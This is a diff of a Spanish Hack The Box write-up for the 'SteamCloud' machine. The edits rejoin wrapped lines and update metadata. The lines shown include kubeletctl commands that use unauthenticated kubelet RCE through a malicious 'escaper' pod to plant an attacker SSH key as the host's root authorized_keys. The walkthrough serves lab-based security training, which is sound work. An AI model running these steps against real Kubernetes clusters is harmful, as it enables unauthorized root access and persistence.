@@ -13,13 +13,13 @@
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7rocky.github.io/htb/steamcloud/"><meta property="article:section" content="htb">
 <meta property="article:published_time" content="2022-02-14T00:00:00+01:00">
-<meta property="article:modified_time" content="2022-02-23T10:00:12+01:00"><meta property="og:site_name" content="7Rocky">
+<meta property="article:modified_time" content="2022-02-23T11:55:42+01:00"><meta property="og:site_name" content="7Rocky">
 <meta property="og:image" content="https://7rocky.github.io/images/HTB/SteamCloud/SteamCloud.png">
 <meta property="og:author" content="7Rocky">
 <meta itemprop=name content="SteamCloud">
 <meta itemprop=description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene un cluster de Kubernetes que expone el kubelet y es vulnerable a RCE sin autenticación. Somos capaces de extraer credenciales de un Pod en ejecución y utilizarlas para crear un Pod malicioso que monta el sistema de archivos de la máquina anfitriona. Para comprometer esta máquina se necesitan conocimientos de pentesting en Kubernetes"><meta itemprop=datePublished content="2022-02-14T00:00:00+01:00">
-<meta itemprop=dateModified content="2022-02-23T10:00:12+01:00">
-<meta itemprop=wordCount content="2744">
+<meta itemprop=dateModified content="2022-02-23T11:55:42+01:00">
+<meta itemprop=wordCount content="2734">
 <meta itemprop=keywords content="api,nginx,k8s,volumes,rce,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="SteamCloud">
@@ -636,20 +636,13 @@ The key's randomart image is:
 +----[SHA256]-----+
 
 <span class=code-cyan>$</span> <span class=code-dark-green>cat</span> id_rsa.pub
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCI  
-FFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw
-26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSp
-kMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=
 </code></pre></div>
 <p>Para copiar esta clave, tenemos que codificar los <code>+</code> (<code>%2b</code>) y el <code>=</code> (<code>%3d</code>) en codificación URL debido a la naturaleza del RCE que tenemos. Además, hay que escapar todas las barras porque <code>sed</code> también utiliza barras para distinguir los textos antiguo y nuevo. También podemos codificar las barras <code>/</code> (<code>%2f</code>) por si acaso:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>cat</span> id_rsa.pub | <span class=code-dark-green>sed</span> <span class=code-dark-yellow>'s/+/%2b/g'</span> | <span class=code-dark-green>sed</span> <span class=code-dark-yellow>'s/\//\\%2f/g'</span> | <span class=code-dark-green>sed</span> <span class=code-dark-yellow>'s/=/%3d/g'</span>
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r\%2fDohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn\%2f7FOQbAyeKko1BdJwlTlrxaNSo%2bWyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf%2bPsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji\%2fy1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq\%2fqIqQy9xVwwl2KJ3df\%2f5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot%2bk0KxaLZpY%2bDxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k%3d  
 
-<span class=code-cyan>$</span> <span class=code-dark-green>./kubeletctl</span> run <span class=code-dark-yellow>'sed -i s/control-plane.minikube.internal/AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r\%2fDohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPV
-QpRNa3eCTu632VcqJ6Rnrn\%2f7FOQbAyeKko1BdJwlTlrxaNSo%2bWyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre5
-7mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf%2bPsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji\%2fy1XA8Nx1TfT
-23xHaCIX8VWYtPJ75GvbTr8fXxqgq\%2fqIqQy9xVwwl2KJ3df\%2f5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot%2bk0KxaLZpY%2bDxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k%3d
-/g /var/log/host/tmp/asdf'</span> --namespace default --pod escaper --container escaper --server 10.10.11.133
+<span class=code-cyan>$</span> <span class=code-dark-green>./kubeletctl</span> run <span class=code-dark-yellow>'sed -i s/control-plane.minikube.internal/AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r\%2fDohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn\%2f7FOQbAyeKko1BdJwlTlrxaNSo%2bWyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf%2bPsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji\%2fy1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq\%2fqIqQy9xVwwl2KJ3df\%2f5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot%2bk0KxaLZpY%2bDxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k%3d/g /var/log/host/tmp/asdf'</span> --namespace default --pod escaper --container escaper --server 10.10.11.133  
 </code></pre></div>
 <p>Y ahora que hemos terminado con las sustituciones, conseguimos un archivo que es válido como <code>authorized_keys</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./kubeletctl</span> run <span class=code-dark-yellow>'cat /var/log/host/tmp/asdf'</span> --namespace default --pod escaper --container escaper --server 10.10.11.133
@@ -661,10 +654,7 @@ QpRNa3eCTu632VcqJ6Rnrn\%2f7FOQbAyeKko1BdJwlTlrxaNSo%2bWyT0pjuCIFFV88kHDqwZ6OpaII
 
 
 
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCI  
-FFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw
-26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSp
-kMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=  
 </code></pre></div>
 <p>Entonces, creamos un directorio llamado <code>.ssh</code> y añadimos este archivo como <code>authorized_keys</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./kubeletctl</span> run <span class=code-dark-yellow>'mkdir /var/log/host/root/.ssh'</span> --namespace default --pod escaper --container escaper --server 10.10.11.133
